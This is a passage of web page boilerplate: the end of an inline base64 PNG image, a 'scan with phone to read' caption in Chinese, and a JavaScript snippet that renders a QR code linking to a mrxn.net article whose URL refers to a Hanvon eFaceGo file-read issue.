T3rFb9ymcesoZ8hhAfjNj9MM8fBtKLF3/tCfzYQPpd55ehDrkr1EXzMw7ndd1vn0JzcF4L0ctbAeHWlVYB0eu6oudL28csry7ua+oasg6w/rb39mGvH3tCIFP266vJV8Com58hxA9BfdWronOIDzA1/T8jwNfnkupTYUFdV8ghPrlYngpIHoLmRYgOwaqpgPDukxf+2ECq2Yq/P4HDQGqSZzFbSq/5GVcXYbxbrO+oX10Ox3qIBiNaK0Lyndu7Y/fJ9cl/F8/qDwP53abL/7MnsA0EctfAY5wt36cNYx/rILp+GLm+jhAfBK3f+9REczDWmIdRh3A4R/uJEJ/cvqJ6R0gdBPf5bSB7cV2/7wTWQN539qcr/w8AAP//v89r3QAAAAZJREFUAwCCxUDa8Ck1ugAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-personnel-fileDownload-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 